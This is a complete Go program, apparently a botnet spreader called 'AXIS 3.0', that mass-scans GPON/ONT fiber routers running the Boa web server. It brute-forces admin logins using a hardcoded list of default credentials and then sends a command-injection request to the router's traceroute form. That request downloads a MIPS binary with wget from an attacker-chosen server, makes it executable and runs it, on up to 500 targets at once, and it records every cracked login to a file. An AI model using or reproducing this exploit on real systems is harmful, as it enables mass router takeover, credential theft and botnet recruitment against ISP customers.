package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

/* ============================================================================
 * FIBER/GPON EXPLOIT SCANNER - GPON/ONT Router Compromise
 * ============================================================================
 * Exploits command injection in GPON/ONT router web interface
 * Targets: Fiber routers with Boa web server (0.93.15)
 * Method: POST /boaform/admin/formTracert command injection
 * Credentials: 24 username/password combinations
 * Global coverage: ISP fiber deployments worldwide
 * ============================================================================ */

// Fiber exploit credentials
var fiberCredentials = []string{
	"adminisp:adminisp",
	"admin:admin",
	"admin:1234567890",
	"admin:123456789",
	"admin:12345678",
	"admin:1234567",
	"admin:123456",
	"admin:12345",
	"admin:1234",
	"admin:user",
	"guest:guest",
	"support:support",
	"user:user",
	"admin:password",
	"default:default",
	"admin:password123",
	"admin:cat1029",
	"admin:pass",
	"admin:dvr2580222",
	"admin:aquario",
	"admin:1111111",
	"administrator:1234",
	"root:root",
	"admin:admin123",
}

// Server IP for payload download
var serverIP string

type FiberResult struct {
	IP       string
	Port     string
	Username string
	Password string
	Success  bool
}

type ScanStats struct {
	Total   int64
	Found   int64
	Logins  int64
}

var stats ScanStats

func checkDevice(target string, timeout time.Duration) bool {
	host, port, err := parseTarget(target)
	if err != nil {
		return false
	}

	conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Check for Boa/0.93.15 server
	payload := fmt.Sprintf(
		"POST /boaform/admin/formLogin HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-GB,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 29\r\n"+
			"Origin: http://%s\r\n"+
			"Connection: keep-alive\r\n"+
			"Referer: http://%s/admin/login.asp\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n\r\n"+
			"username=admin&psd=Feefifofum\r\n\r\n",
		target, target, target)

	conn.SetWriteDeadline(time.Now().Add(timeout))
	conn.Write([]byte(payload))

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}

	response := string(buf[:n])
	if strings.Contains(response, "Server: Boa/0.93.15") {
		return true
	}

	return false
}

func sendLogin(target string) (bool, string, string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return false, "", ""
	}

	for _, cred := range fiberCredentials {
		parts := strings.Split(cred, ":")
		if len(parts) != 2 {
			continue
		}
		username, password := parts[0], parts[1]

		conn, err := net.DialTimeout("tcp", host+":"+port, 10*time.Second)
		if err != nil {
			continue
		}

		contentLength := 14 + len(username) + len(password)
		payload := fmt.Sprintf(
			"POST /boaform/admin/formLogin HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"+
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
				"Accept-Language: en-GB,en;q=0.5\r\n"+
				"Accept-Encoding: gzip, deflate\r\n"+
				"Content-Type: application/x-www-form-urlencoded\r\n"+
				"Content-Length: %d\r\n"+
				"Origin: http://%s\r\n"+
				"Connection: keep-alive\r\n"+
				"Referer: http://%s/admin/login.asp\r\n"+
				"Upgrade-Insecure-Requests: 1\r\n\r\n"+
				"username=%s&psd=%s\r\n\r\n",
			target, contentLength, target, target, username, password)

		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn.Write([]byte(payload))

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		buf := make([]byte, 512)
		n, err := conn.Read(buf)
		conn.Close()

		if err != nil {
			continue
		}

		response := string(buf[:n])
		if strings.Contains(response, "HTTP/1.0 302 Moved Temporarily") {
			return true, username, password
		}
	}

	return false, "", ""
}

func sendExploit(target string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return
	}

	conn, err := net.DialTimeout("tcp", host+":"+port, 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	// Command injection payload - downloads and executes binary
	payload := fmt.Sprintf(
		"POST /boaform/admin/formTracert HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
			"Accept-Language: en-GB,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 201\r\n"+
			"Origin: http://%s\r\n"+
			"Connection: close\r\n"+
			"Referer: http://%s/diag_tracert_admin_en.asp\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n\r\n"+
			"target_addr=;rm -rf /var/tmp/wlancont;wget http://%s/bins/axis.mips -O ->/var/tmp/wlancont;chmod 777 /var/tmp/wlancont;/var/tmp/wlancont fiber&waninf=1_INTERNET_R_VID_\r\n\r\n",
		target, target, target, serverIP)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(payload))

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buf := make([]byte, 512)
	conn.Read(buf)
}

func processTarget(target string, wg *sync.WaitGroup, results chan<- FiberResult, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	atomic.AddInt64(&stats.Total, 1)

	// Check if device is vulnerable (Boa server)
	if !checkDevice(target, 10*time.Second) {
		return
	}

	atomic.AddInt64(&stats.Found, 1)

	// Try login
	success, username, password := sendLogin(target)
	if success {
		atomic.AddInt64(&stats.Logins, 1)
		results <- FiberResult{
			IP:       target,
			Port:     "80",
			Username: username,
			Password: password,
			Success:  true,
		}
	}

	// Send exploit regardless of login success
	sendExploit(target)
}

func parseTarget(target string) (host, port string, err error) {
	if strings.Contains(target, ":") {
		parts := strings.SplitN(target, ":", 2)
		return parts[0], parts[1], nil
	}
	return target, "80", nil
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		targets = append(targets, line)
	}

	return targets, scanner.Err()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./fiber <target-list.txt> <server-ip> [threads]")
		fmt.Println("Example: ./fiber targets.txt 1.2.3.4 500")
		fmt.Println("")
		fmt.Println("Target format:")
		fmt.Println("  - IP addresses: 192.168.1.1")
		fmt.Println("  - IP:Port: 192.168.1.1:80")
		fmt.Println("")
		fmt.Println("Exploits Boa web server command injection in GPON/ONT routers")
		fmt.Println("Payload: wget http://<server>/bins/axis.mips; chmod 777; execute")
		os.Exit(1)
	}

	targetFile := os.Args[1]
	serverIP = os.Args[2]
	threads := 500
	if len(os.Args) > 3 {
		threads, _ = strconv.Atoi(os.Args[3])
	}

	fmt.Printf("[*] AXIS 3.0 Fiber/GPON Exploit Scanner\n")
	fmt.Printf("[*] Loading targets from: %s\n", targetFile)
	fmt.Printf("[*] Payload server: %s\n", serverIP)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	targets, err := loadTargets(targetFile)
	if err != nil {
		fmt.Printf("[-] Error loading targets: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d targets\n", len(targets))
	fmt.Printf("[*] Starting exploitation...\n\n")

	var wg sync.WaitGroup
	results := make(chan FiberResult, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("fiber_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()

		for result := range results {
			if result.Success {
				line := fmt.Sprintf("%s:%s | %s:%s\n", result.IP, result.Port, result.Username, result.Password)
				f.WriteString(line)
				fmt.Printf("[+] FIBER EXPLOITED: %s:%s | Login: %s:%s\n", result.IP, result.Port, result.Username, result.Password)
			} else {
				fmt.Printf("[+] FIBER HIT: %s:%s (exploit sent)\n", result.IP, result.Port)
			}
		}
	}()

	// Start status printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		i := 0
		for range ticker.C {
			fmt.Printf("[%d's] Total: %d, Found: %d, Logins: %d          \r",
				i, atomic.LoadInt64(&stats.Total), atomic.LoadInt64(&stats.Found), atomic.LoadInt64(&stats.Logins))
			i++
		}
	}()

	startTime := time.Now()

	for _, target := range targets {
		wg.Add(1)
		go processTarget(target, &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n\n[*] Fiber exploitation completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: fiber_results.txt\n")
	fmt.Printf("[*] Total: %d | Found: %d | Logins: %d\n",
		atomic.LoadInt64(&stats.Total),
		atomic.LoadInt64(&stats.Found),
		atomic.LoadInt64(&stats.Logins))
}
